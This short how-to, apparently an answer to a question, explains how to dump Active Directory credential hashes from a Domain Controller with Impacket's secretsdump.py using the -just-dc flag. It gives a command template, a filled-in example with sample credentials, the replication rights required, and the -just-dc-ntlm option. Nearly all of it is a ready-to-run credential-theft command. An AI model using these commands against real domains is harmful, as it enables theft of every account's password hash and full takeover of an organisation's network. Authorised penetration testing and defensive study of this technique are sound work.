Use `secretsdump.py` with valid domain credentials pointed at a Domain Controller and the `-just-dc` flag:

```bash
python3 secretsdump.py 'DOMAIN/user:password'@DC_IP -just-dc
```

Example:

```bash
python3 secretsdump.py 'corp.local/jsmith:Password123'@dc.corp.local -just-dc
```

The account must have directory replication rights (e.g., be a Domain Admin or have `DS-Replication-Get-Changes-All` / `DS-Replication-Get-Changes`). Use `-just-dc-ntlm` if you only want the NTLM hashes.